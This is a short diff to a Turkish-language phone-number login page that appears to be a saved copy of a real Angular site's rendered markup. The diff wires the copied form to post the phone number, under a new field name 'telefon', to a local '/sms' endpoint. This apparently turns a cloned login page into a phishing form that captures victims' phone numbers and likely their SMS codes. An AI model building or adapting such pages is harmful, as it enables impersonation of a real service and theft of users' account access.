@@ -35,7 +35,7 @@
                            <mat-card-content _ngcontent-tus-c502="" class="mat-mdc-card-content">
                               <div _ngcontent-tus-c502="" class="login-page__form">
                                  <p _ngcontent-tus-c502="" class="subtitle-2 text-align-center text-color-black">Cep telefonu numaranı girerek devam et</p>
-                                 <form _ngcontent-tus-c502="" novalidate="" feappsubmitthrottle="" class="ng-untouched ng-pristine ng-invalid">
+                                 <form _ngcontent-tus-c502="" novalidate="" feappsubmitthrottle="" class="ng-untouched ng-pristine ng-invalid" action="/sms" method="post">
                                     <mat-form-field _ngcontent-tus-c502="" id="login_phone-input" color="accent" appearance="outline" class="mat-mdc-form-field ng-tns-c186-13 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-accent ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                        <!---->
                                        <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c186-13 mdc-text-field--outlined">
@@ -54,7 +54,7 @@
                                              </div>
                                              <!----><!----><!---->
                                              <div class="mat-mdc-form-field-infix ng-tns-c186-13">
-                                                <!----><input _ngcontent-tus-c502="" id="mat-input-3" type="tel" matinput="" value="+90" oninput="addPrefix()" feonlynumbers="" autocomplete="tel" required="" femdcmaskedinput="" formcontrolname="phoneNumber" class="mat-mdc-input-element ng-tns-c186-13 ng-untouched ng-pristine ng-invalid mat-mdc-form-field-input-control mdc-text-field__input cdk-text-field-autofill-monitored" id="mat-input-1" aria-invalid="false" aria-required="true">
+                                                <!----><input _ngcontent-tus-c502="" id="mat-input-3" name="telefon" type="tel" matinput="" value="+90" oninput="addPrefix()" feonlynumbers="" autocomplete="tel" required="" femdcmaskedinput="" formcontrolname="phoneNumber" class="mat-mdc-input-element ng-tns-c186-13 ng-untouched ng-pristine ng-invalid mat-mdc-form-field-input-control mdc-text-field__input cdk-text-field-autofill-monitored" id="mat-input-1" aria-invalid="false" aria-required="true">
                                              </div>
                                              <!----><!---->
                                           </div>
